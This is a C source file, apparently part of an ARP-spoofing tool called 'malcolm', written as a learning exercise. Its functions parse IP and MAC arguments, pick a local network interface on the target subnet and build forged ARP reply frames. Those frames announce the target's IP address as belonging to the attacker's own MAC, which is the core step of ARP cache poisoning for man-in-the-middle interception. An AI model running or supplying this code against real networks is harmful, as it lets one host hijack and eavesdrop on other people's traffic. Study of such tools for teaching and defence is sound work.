#include "malcolm.h"

int fill_addr(struct sockaddr_in *inAddress, char *addr)
{
    int rval = 0;

    //fill port
    (*inAddress).sin_port = htons(PORT);
    //fill type of address
    (*inAddress).sin_family = AF_INET;
    //convert my input ip address ip to binary 
    if(!(rval = inet_pton(AF_INET, addr, &inAddress->sin_addr.s_addr)))
    {
        printf("Invalid IP address: %s\n", addr);
        return(1);
    }
    else if(rval == -1)
    {
        printf("Error translating target address: %s\n",strerror(errno));
        return(errno);
    }
    ft_memset(&(inAddress->sin_zero), '\0', 8);
    return(0);
}

int fill_mac(const char *mac_str, char src_mac[6]){
    int values[6];
    if( 6 == sscanf(mac_str, "%x:%x:%x:%x:%x:%x%*c",
        &values[0], &values[1], &values[2],
        &values[3], &values[4], &values[5]) )
    {
        // convert to uint8_t
        for( int i = 0; i < 6; ++i )
            src_mac[i] = (char) values[i];
        return 0;
    }
    else
    {
        printf("Invalid MAC address format: %s\n", mac_str);
        return 1;
    }
}

int fill_sockaddr_ll(struct sockaddr_ll *sll, int if_index, unsigned char *mac_addr) {
    ft_memset(sll, 0, sizeof(struct sockaddr_ll));
    sll->sll_family = AF_PACKET;
    sll->sll_protocol = htons(ETH_P_ALL);
    sll->sll_ifindex = if_index;
    sll->sll_halen = ETH_ALEN;
    ft_memcpy(sll->sll_addr, mac_addr, ETH_ALEN);
    return 0;
}

bool verify_mac(unsigned char *mac1, unsigned char *mac2){
    if(ft_strlen((const char*)mac1) != 17 || ft_strlen((const char*)mac2) != 17)
        return false;
    if(mac1[2] != ':' || mac1[5] != ':' || mac1[8] != ':' || mac1[11] != ':' || mac1[14] != ':' ||
        mac2[2] != ':' || mac2[5] != ':' || mac2[8] != ':' || mac2[11] != ':' || mac2[14] != ':')
        return false;
    for(int i = 0; i < 17; i++){
        if(i == 2 || i == 5 || i == 8 || i == 11 || i == 14)
            continue;
        if(!((mac1[i] >= '0' && mac1[i] <= '9') || (mac1[i] >= 'a' && mac1[i] <= 'f') || (mac1[i] >= 'A' && mac1[i] <= 'F')))
            return false;
        if(!((mac2[i] >= '0' && mac2[i] <= '9') || (mac2[i] >= 'a' && mac2[i] <= 'f') || (mac2[i] >= 'A' && mac2[i] <= 'F')))
            return false;
    }
    return true;
}

bool verify_arguments(int argc, char *argv[], struct Malcolm *malcolm){
    //verify arguments
    if(argc != 5)
    {
        printf("Usage: %s <source IP> <source MAC> <target IP> <target MAC>\n", argv[0]);
        return(false);
    }

    if(!verify_mac((unsigned char *)argv[2], (unsigned char *)argv[4]))
    {
        printf("Invalid MAC address format.\n");
        return(false);
    }

    //fill the ip address and mac address from arguments
    if(fill_addr(&malcolm->srcaddr, argv[1]) || fill_addr(&malcolm->targetaddr, argv[3]))
        return(false);
    return true;
}

void print_uchar(unsigned char *array)
{
    for(int i = 0; i < 4; i++)
    {
        if(i != 3)
            printf("%d.", array[i]);
        else
            printf("%d", array[i]);
    }
    printf("\n");
}

void print_mac(unsigned char *mac) 
{
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

bool get_interface(struct Malcolm *malcolm){
    char buffer[1024];

    // retrieve my local network address into a link list
    if(getifaddrs(&malcolm->ifaddr) == -1)
    {
        printf("error on getting addr: %s\n", strerror(errno));
        return(false);
    }

    struct ifaddrs *copyInterfaceIp = malcolm->ifaddr;
    struct ifaddrs *copyInterfaceMac = malcolm->ifaddr;

    //iterate through my link list
    while(copyInterfaceIp){
        if(copyInterfaceIp->ifa_addr && copyInterfaceIp->ifa_addr->sa_family == AF_INET){
            uint32_t ip = ((struct sockaddr_in *)copyInterfaceIp->ifa_addr)->sin_addr.s_addr;
            uint32_t mask = ((struct sockaddr_in *)copyInterfaceIp->ifa_netmask)->sin_addr.s_addr;
            if((ip & mask) == (malcolm->srcaddr.sin_addr.s_addr & mask) && (ip & mask) == (malcolm->targetaddr.sin_addr.s_addr & mask)){
                while(copyInterfaceMac){
                    if(copyInterfaceMac->ifa_addr && !ft_memcmp(copyInterfaceMac->ifa_name, copyInterfaceIp->ifa_name, ft_strlen(copyInterfaceIp->ifa_name))
                    && copyInterfaceMac->ifa_addr->sa_family == AF_PACKET)
                    {
                        printf("Found available interface: %s\n", copyInterfaceMac->ifa_name);
                        malcolm->interfaceIp = (struct sockaddr_in*)copyInterfaceIp->ifa_addr;
                        malcolm->interfaceMac = (struct sockaddr_ll*)copyInterfaceMac->ifa_addr;

                        inet_ntop(AF_INET, &malcolm->interfaceIp->sin_addr, buffer, 1024);
                        malcolm->index_interface = if_nametoindex(copyInterfaceMac->ifa_name);
                        if(malcolm->index_interface == 0)
                            return(printf("error index %s\n", strerror(errno)), 1);
                        printf("\tIp Address: ");
                        print_uchar((unsigned char *)&malcolm->interfaceIp->sin_addr.s_addr);
                        printf("\tMac Address: ");
                        print_mac(malcolm->interfaceMac->sll_addr);
                    }
                    copyInterfaceMac = copyInterfaceMac->ifa_next;
                }
                return true;
            }
        }
        copyInterfaceIp = copyInterfaceIp->ifa_next;
    }
    return false;
}

unsigned char *create_arp_response(struct Malcolm malcolm, struct ethhdr *eth, struct arp_header *arp){
    unsigned char *buffersend = malloc(42);
    if (!buffersend) {
        perror("malloc");
        return NULL;
    }
    ft_memset(buffersend, 0, 42);

    struct ethhdr *ethsend = (struct ethhdr *)buffersend;
    struct arp_header *arpsend = (struct arp_header *)(buffersend + sizeof(struct ethhdr));
    ft_memset(ethsend, 0, sizeof(struct ethhdr));
    ft_memset(arpsend, 0, sizeof(struct arp_header));

    //eth header
    ethsend->h_proto = htons(ETH_P_ARP); // PROTOCOLE ARP
    ft_memcpy(ethsend->h_dest, eth->h_source, ETH_ALEN); // MAC dest which is the mac src of the previous request
    ft_memcpy(ethsend->h_source, malcolm.interfaceMac->sll_addr, ETH_ALEN); // MAC source which is my MAC address

    //arp header
    arpsend->hardware_type = htons(1); // ethernet
    arpsend->protocol_type = htons(ETH_P_IP);
    arpsend->hardware_len = 6; // mac length
    arpsend->protocol_len = 4; // ip length
    arpsend->opcode = htons(0x02); // response ARP
    ft_memcpy(arpsend->sender_mac, malcolm.interfaceMac->sll_addr, ETH_ALEN); // fill with my MAC
    ft_memcpy(arpsend->sender_ip, &malcolm.targetaddr.sin_addr.s_addr, 4); // fill with initial target IP
    ft_memcpy(arpsend->target_mac, arp->sender_mac, ETH_ALEN); // SRC MAC
    ft_memcpy(arpsend->target_ip, arp->sender_ip, 4); // SRC IP
    return buffersend;
}